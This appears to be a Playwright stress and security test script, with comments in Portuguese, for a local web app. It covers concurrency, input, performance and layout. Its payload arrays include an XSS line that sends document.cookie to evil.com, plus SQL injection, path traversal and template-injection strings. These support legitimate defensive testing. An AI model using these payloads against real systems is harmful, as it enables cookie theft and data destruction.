import { chromium } from 'playwright';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const BASE = 'http://localhost:5173';
const LOG_DIR = path.resolve(__dirname, '..', 'docs', 'QA');
const SS_DIR = path.join(LOG_DIR, 'screenshots-stress');
if (!fs.existsSync(SS_DIR)) fs.mkdirSync(SS_DIR, { recursive: true });

const findings = [];
let allLogs = [];

function finding({ title, severity, phase, steps, impact, cause, files, fix }) {
  findings.push({ title, severity, phase, steps, impact, cause, files, fix, console: allLogs.filter(l => l.type === 'error' || l.type === 'warning').slice(0, 5) });
  console.log(`\n[${severity}] ${title}`);
}

async function ss(page, label) {
  try { await page.screenshot({ path: path.join(SS_DIR, `${label}.png`), fullPage: true }); } catch (e) {}
}

async function run() {
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox', '--disable-gpu'] });
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 800 }, locale: 'pt-BR' });
  const page = await ctx.newPage();

  page.on('console', msg => { allLogs.push({ type: msg.type(), text: msg.text() }); });
  page.on('pageerror', err => { allLogs.push({ type: 'pageerror', text: err.message }); });

  function clearLogs() { allLogs = []; }

  // =============================================
  // FASE 1: FLUXOS EXTREMOS
  // =============================================
  console.log('\n========== FASE 1: FLUXOS EXTREMOS ==========');

  // 1A: RÁPIDO CLIQUE MÚLTIPLO
  console.log('\n--- 1A: Clique rápido múltiplo ---');
  await page.goto(BASE, { waitUntil: 'load', timeout: 20000 }).catch(() => {});
  await page.waitForTimeout(2000);
  
  // Rapid click on Entrar button 10 times fast
  const entrarBtn = page.locator('button:has-text("Entrar")').first();
  if (await entrarBtn.isVisible({ timeout: 2000 }).catch(() => false)) {
    for (let i = 0; i < 10; i++) {
      await entrarBtn.click({ force: true, timeout: 100 }).catch(() => {});
    }
    await page.waitForTimeout(1000);
    const errs = allLogs.filter(l => l.type === 'error' || l.type === 'pageerror');
    if (errs.length > 0) {
      finding({ title: 'Múltiplos cliques rápidos causam erros', severity: 'P2', phase: '1A', steps: 'Clicar Entrar 10x rápido', impact: 'Possível duplicação de chamadas', cause: 'Sem debounce no botão', files: 'Login.jsx', fix: 'Debounce no onClick do botão Entrar' });
    }
    clearLogs();
  }

  // 1B: LOGIN DUAS ABAS
  console.log('\n--- 1B: Duas abas simultâneas ---');
  const page2 = await ctx.newPage();
  await page2.goto(BASE, { waitUntil: 'load', timeout: 15000 }).catch(() => {});
  await page.waitForTimeout(1000);
  await page2.waitForTimeout(1000);
  
  // Fill login in both tabs rapidly
  const email1 = page.locator('input[type="email"]').first();
  const email2 = page2.locator('input[type="email"]').first();
  if (await email1.isVisible({ timeout: 2000 }).catch(() => false) && 
      await email2.isVisible({ timeout: 2000 }).catch(() => false)) {
    await email1.fill('tab1@test.com');
    await email2.fill('tab2@test.com');
    
    // Submit both rapidly
    const submit1 = page.locator('button[type="submit"]').first();
    const submit2 = page2.locator('button[type="submit"]').first();
    
    // Rapid interleaved clicks
    await submit1.click({ timeout: 1000 }).catch(() => {});
    await submit2.click({ timeout: 1000 }).catch(() => {});
    await page.waitForTimeout(2000);
    const errs = allLogs.filter(l => l.type === 'error' || l.type === 'pageerror');
    if (errs.length > 0) {
      finding({ title: 'Login simultâneo em 2 abas causa erros', severity: 'P2', phase: '1B', steps: 'Login em 2 abas ao mesmo tempo', impact: 'Possível race na sessão', cause: 'Auth state race condition', files: 'useAuthBootstrap.js, useSession.js', fix: 'Token de sessão único por aba' });
    }
  }
  await page2.close();
  clearLogs();

  // 1C: REFRESH DURANTE LOGIN
  console.log('\n--- 1C: Refresh durante login ---');
  await page.goto(BASE, { waitUntil: 'load', timeout: 15000 }).catch(() => {});
  await page.waitForTimeout(1000);
  const email = page.locator('input[type="email"]').first();
  if (await email.isVisible({ timeout: 2000 }).catch(() => false)) {
    await email.fill('refresh@test.com');
    const pass = page.locator('input[type="password"]').first();
    if (await pass.isVisible().catch(() => false)) {
      await pass.fill('test123');
      // Rapid submit + refresh
      await page.evaluate(() => {
        document.querySelector('button[type="submit"]')?.click();
        setTimeout(() => location.reload(), 100);
      });
      await page.waitForTimeout(2000);
      const errs = allLogs.filter(l => l.type === 'error' || l.type === 'pageerror');
      if (errs.length > 0) {
        finding({ title: 'Refresh durante login causa erro', severity: 'P1', phase: '1C', steps: 'Submeter login + refresh imediato', impact: 'Sessão parcial', cause: 'Auth request interrompido', files: 'Login.jsx, lib/auth.js', fix: 'AbortController na chamada de login' });
      }
    }
  }
  clearLogs();

  // 1D: ALTERAR MESMO REGISTRO EM DUAS ABAS
  console.log('\n--- 1D: Edição concorrente ---');
  // This requires being logged in. We'll test the normal flow instead.
  // For stress: rapid navigation between pages
  await page.goto(BASE, { waitUntil: 'load', timeout: 15000 }).catch(() => {});
  await page.waitForTimeout(500);

  // 1E: RAPID NAVIGATION STRESS
  console.log('\n--- 1E: Navegação rápida entre rotas ---');
  const routes = ['', 'dashboard', 'income', 'expense', 'inventory', 'report', 'settings', 'planos', 'brandstudio', 'email', 'privacidade', 'termos'];
  for (const r of routes) {
    const url = r ? `${BASE}/#/${r}` : BASE;
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 5000 }).catch(() => {});
  }
  const errs = allLogs.filter(l => l.type === 'error' || l.type === 'pageerror');
  if (errs.length > 0) {
    finding({ title: 'Navegação rápida entre rotas causa erros', severity: 'P1', phase: '1E', steps: 'Navegar rapidamente entre 12 rotas', impact: 'Componentes podem falhar ao montar/desmontar', cause: 'Lazy loading race condition', files: 'routes/routes.jsx', fix: 'Verificar lazy imports e Suspense boundaries' });
  }
  clearLogs();

  // =============================================
  // FASE 2: DADOS EXTREMOS
  // =============================================
  console.log('\n========== FASE 2: DADOS EXTREMOS ==========');

  // 2A: XSS no form de login
  console.log('\n--- 2A: Injeção XSS ---');
  await page.goto(BASE, { waitUntil: 'load', timeout: 15000 }).catch(() => {});
  await page.waitForTimeout(1000);
  
  const xssPayloads = [
    '<script>alert(1)</script>',
    '"><script>fetch("https://evil.com/steal?"+document.cookie)</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    `'; DROP TABLE users; --`,
    '../../etc/passwd',
    '${7*7}',
    '{{constructor.constructor("alert(1)")()}}',
  ];

  const emailField = page.locator('input[type="email"]').first();
  const nameField = page.locator('input[placeholder*="Ex: Padaria"]').first();
  
  // Test XSS in name field (signup mode)
  const criarBtn = page.locator('button:has-text("Criar conta")').first();
  if (await criarBtn.isVisible({ timeout: 1000 }).catch(() => false)) {
    await criarBtn.click();
    await page.waitForTimeout(500);
  }

  for (const payload of xssPayloads) {
    if (await nameField.isVisible({ timeout: 500 }).catch(() => false)) {
      await nameField.fill(payload);
      await page.waitForTimeout(100);
      // Check if payload rendered unsanitized
      const bodyHTML = await page.evaluate(() => document.body.innerHTML);
      if (bodyHTML.includes(payload) && !bodyHTML.includes('&lt;') && !bodyHTML.includes('&#x')) {
        finding({ title: `Possível XSS: payload "${payload.substring(0, 30)}" não escapado`, severity: 'P2', phase: '2A', steps: `Inserir ${payload} no campo nome`, impact: 'XSS refletido', cause: 'Falta sanitização de output', files: 'Login.jsx', fix: 'Usar textContent ou React escaping' });
        break;
      }
    }
  }
  clearLogs();

  // 2B: UNICODE / EMOJIS
  console.log('\n--- 2B: Caracteres especiais ---');
  const specialChars = [
    '𝒮𝒸𝓇𝒾𝓅𝓉',
    '𝕱𝖗𝖆𝖐𝖙𝖚𝖗',
    'Hello 世界',
    'Olá você está bem?',
    '🚀🔥💩 test 🎉',
    'null\u0000byte',
    'a\u202Eb\u202Ec\u202Ed',
    '１２３４５６７８９０',
    '👨‍👩‍👧‍👦family',
    'Z̷̻̊a̶̖̎l̶͕̅g̶̭͂o̶̰̓',
  ];

  if (await nameField.isVisible({ timeout: 500 }).catch(() => false)) {
    for (const chars of specialChars) {
      await nameField.fill(chars);
      await page.waitForTimeout(50);
      // Verify input accepted without error
      const val = await nameField.inputValue();
      if (val !== chars) {
        finding({ title: `Input sanitiza ou corrompe caracteres especiais: "${chars.substring(0, 20)}"`, severity: 'P3', phase: '2B', steps: `Inserir "${chars}"`, impact: 'Perda de dados do usuário', cause: 'Sanitização excessiva no input', files: 'Login.jsx, lib/utils.js (safe())', fix: 'Revisar sanitização para preservar UTF-8' });
        break;
      }
    }
  }
  clearLogs();

  // 2C: SQL INJECTION VIA INPUT
  console.log('\n--- 2C: SQL Injection patterns ---');
  const sqlPayloads = [
    "1' OR '1'='1",
    "1; DROP TABLE products; --",
    "' UNION SELECT * FROM auth.users --",
    "admin'--",
    "1' AND 1=CAST((SELECT COUNT(*) FROM pg_class) AS TEXT) > 0 --",
  ];
  const emailFld = page.locator('input[type="email"]').first();
  if (await emailFld.isVisible({ timeout: 1000 }).catch(() => false)) {
    for (const payload of sqlPayloads) {
      await emailFld.fill(payload);
      await page.waitForTimeout(50);
    }
  }
  clearLogs();

  // 2D: VALORES EXTREMOS
  console.log('\n--- 2D: Valores extremos ---');
  const maxField = page.locator('input[type="email"]').first();
  if (await maxField.isVisible({ timeout: 1000 }).catch(() => false)) {
    // Very long text
    const longText = 'a'.repeat(100000);
    await maxField.fill(longText.substring(0, 1000));
    await page.waitForTimeout(100);
    
    // Negative numbers
    const passFld = page.locator('input[type="password"]').first();
    if (await passFld.isVisible().catch(() => false)) {
      await passFld.fill('-1');
    }
  }
  clearLogs();

  // =============================================
  // FASE 3: PERFORMANCE (básico)
  // =============================================
  console.log('\n========== FASE 3: PERFORMANCE ==========');

  // 3A: Memory / Heap
  console.log('\n--- 3A: Métricas de performance ---');
  const perfMetrics = await page.evaluate(() => {
    return {
      jsHeapSize: (performance.memory?.usedJSHeapSize || 0),
      domNodes: document.querySelectorAll('*').length,
      eventListeners: 0,
    };
  }).catch(() => ({}));
  
  console.log(`  JS Heap: ${Math.round((perfMetrics.jsHeapSize || 0) / 1024 / 1024)}MB`);
  console.log(`  DOM nodes: ${perfMetrics.domNodes}`);

  if ((perfMetrics.jsHeapSize || 0) > 200 * 1024 * 1024) {
    finding({ title: 'Uso de memória JS alto (>200MB)', severity: 'P2', phase: '3A', steps: 'Abrir landing page', impact: 'Performance degradada em dispositivos limitados', cause: 'Possível memory leak', files: 'App.jsx, hooks', fix: 'Verificar closures em useEffect' });
  }

  // 3B: Verificar event listeners acumulados
  const listenerCount = await page.evaluate(() => {
    const allElements = document.querySelectorAll('*');
    let count = 0;
    allElements.forEach(el => {
      const listeners = getEventListeners?.(el);
      if (listeners) count += Object.keys(listeners).length;
    });
    return count;
  }).catch(() => 0);
  console.log(`  Approx listeners: ${listenerCount}`);

  // 3C: FPS simulation (rapid interactions)
  console.log('\n--- 3C: Estresse de interação ---');
  await page.goto(BASE, { waitUntil: 'load', timeout: 15000 }).catch(() => {});
  await page.waitForTimeout(1000);
  
  // Rapid scroll
  for (let i = 0; i < 30; i++) {
    await page.evaluate(() => window.scrollBy(0, 200));
  }
  await page.waitForTimeout(500);
  // Rapid scroll back
  for (let i = 0; i < 30; i++) {
    await page.evaluate(() => window.scrollBy(0, -200));
  }
  clearLogs();

  // 3D: Measure load time
  const startTime = Date.now();
  await page.goto(BASE, { waitUntil: 'load', timeout: 15000 }).catch(() => {});
  const loadTime = Date.now() - startTime;
  console.log(`  Load time: ${loadTime}ms`);
  if (loadTime > 5000) {
    finding({ title: `Tempo de carregamento alto: ${loadTime}ms`, severity: 'P2', phase: '3D', steps: 'Recarregar landing page', impact: 'UX prejudicada', cause: 'Bundle grande ou lazy loading', files: 'vite.config.js', fix: 'Code splitting adicional' });
  }

  // 3E: Memory leak test - navigate many times
  console.log('\n--- 3E: Teste de vazamento de memória ---');
  const heapBefore = await page.evaluate(() => performance.memory?.usedJSHeapSize || 0).catch(() => 0);
  // Navigation loop
  for (let iter = 0; iter < 20; iter++) {
    for (const r of ['', 'dashboard', 'income', 'expense', 'inventory', 'privacidade']) {
      const url = r ? `${BASE}/#/${r}` : BASE;
      await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 3000 }).catch(() => {});
    }
  }
  const heapAfter = await page.evaluate(() => performance.memory?.usedJSHeapSize || 0).catch(() => 0);
  const heapGrowth = heapAfter - heapBefore;
  console.log(`  Heap growth: ${Math.round(heapGrowth / 1024 / 1024)}MB`);
  if (heapGrowth > 50 * 1024 * 1024) {
    finding({ title: `Possível memory leak: heap cresceu ${Math.round(heapGrowth/1024/1024)}MB após 120 navegações`, severity: 'P2', phase: '3E', steps: 'Navegar entre 6 rotas 20 vezes', impact: 'App fica lento com o tempo', cause: 'Listeners/observers não limpos', files: 'Múltiplos (ver fase 7)', fix: 'Verificar cleanup em useEffect' });
  }

  // =============================================
  // FASE 5: UX EXTREMA
  // =============================================
  console.log('\n========== FASE 5: UX EXTREMA ==========');

  // 5A: ZOOM 200%
  console.log('\n--- 5A: Zoom 200% ---');
  await page.evaluate(() => { document.body.style.zoom = '2'; });
  await page.waitForTimeout(500);
  await ss(page, '05a-zoom200');
  const zoomOverflow = await page.evaluate(() => document.documentElement.scrollWidth > window.innerWidth + 50);
  if (zoomOverflow) {
    finding({ title: 'Zoom 200% causa overflow horizontal', severity: 'P2', phase: '5A', steps: 'Aplicar zoom 200%', impact: 'Conteúdo cortado em acessibilidade', cause: 'Layout não responsivo a zoom', files: 'index.css, Landing.jsx', fix: 'Usar unidades relativas (rem) e overflow-x-hidden' });
  }
  await page.evaluate(() => { document.body.style.zoom = '1'; });
  clearLogs();

  // 5B: WINDOW PEQUENO (320px)
  console.log('\n--- 5B: Viewport 320px ---');
  await page.setViewportSize({ width: 320, height: 568 });
  await page.goto(BASE, { waitUntil: 'load', timeout: 15000 }).catch(() => {});
  await page.waitForTimeout(2000);
  await ss(page, '05b-viewport320');
  const overflow320 = await page.evaluate(() => document.documentElement.scrollWidth > 325);
  if (overflow320) {
    finding({ title: 'Viewport 320px tem scroll horizontal', severity: 'P2', phase: '5B', steps: 'Redimensionar para 320px', impact: 'Quebra em devices muito pequenos', cause: 'Layout com largura mínima fixa', files: 'Landing.jsx', fix: 'Usar 100% width e overflow-x-hidden' });
  }
  await page.setViewportSize({ width: 1280, height: 800 });

  // 5C: WINDOW GRANDE (2560px)
  console.log('\n--- 5C: Viewport 2560px ---');
  await page.setViewportSize({ width: 2560, height: 1440 });
  await page.goto(BASE, { waitUntil: 'load', timeout: 15000 }).catch(() => {});
  await page.waitForTimeout(1000);
  await ss(page, '05c-viewport2560');
  await page.setViewportSize({ width: 1280, height: 800 });
  clearLogs();

  // =============================================
  // REPORT
  // =============================================
  console.log('\n========== GERANDO RELATÓRIO ==========');
  
  // Count severity
  const p0 = findings.filter(f => f.severity === 'P0').length;
  const p1 = findings.filter(f => f.severity === 'P1').length;
  const p2 = findings.filter(f => f.severity === 'P2').length;
  const p3 = findings.filter(f => f.severity === 'P3').length;

  console.log(`P0: ${p0}, P1: ${p1}, P2: ${p2}, P3: ${p3}`);
  console.log(`Total: ${findings.length}`);
  
  // Pass findings back as JSON
  const results = { p0, p1, p2, p3, total: findings.length, findings };
  fs.writeFileSync(path.join(LOG_DIR, 'stress-results.json'), JSON.stringify(results, null, 2));
  console.log(`Saved to ${LOG_DIR}/stress-results.json`);

  // Print findings summary
  findings.forEach(f => {
    console.log(`\n[${f.severity}] ${f.title}`);
    console.log(`  Steps: ${f.steps}`);
    console.log(`  Impact: ${f.impact}`);
  });

  await browser.close();
  return findings;
}

run().catch(err => { console.error(err); process.exit(1); });
